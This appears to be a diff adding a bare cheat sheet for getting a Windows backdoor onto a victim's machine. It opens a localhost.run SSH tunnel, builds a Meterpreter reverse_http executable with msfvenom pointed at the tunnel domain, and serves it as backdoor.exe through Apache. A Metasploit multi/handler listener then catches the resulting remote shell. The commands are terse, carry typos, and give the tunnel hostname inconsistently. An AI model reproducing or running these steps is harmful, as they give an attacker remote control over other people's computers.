@@ -1,0 +1,19 @@
+localhost.run
+sudo su
+ssh-keygen
+ssh -R 80:localhost:80 localhost.run
+msfvenom -p windows/meterpreter/reverse_http LHOST=63645780a24ac.lhrtunnel.link LPORT=80 -f exe -o backdoor.exe
+move file to var/www/html
+srvice apache2 start
+
+a63645780a24ac.lhrtunnel.link/backdoor.exe
+srvice apache2 stop
+
+
+msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set LHOST <IP Address>
+set LPORT <Port Number>
+set ReverseListenerBindAddress localhost
+run
